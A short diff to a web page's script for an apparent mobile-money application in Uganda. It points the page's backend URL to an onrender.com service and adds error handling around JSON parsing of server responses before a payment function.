@@ -256,7 +256,7 @@ color:#666;
 <script>
 "use strict";
 
-const BACKEND_URL="";
+const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
 
 const applicant=
 localStorage.getItem("fullName")||
@@ -307,7 +307,12 @@ return phone;
 
 async function readJson(res){
 const txt=await res.text();
-return txt?JSON.parse(txt):{};
+
+try{
+return txt ? JSON.parse(txt) : {};
+}catch{
+throw new Error(txt || "Invalid server response.");
+}
 }
 
 async function payNow(){
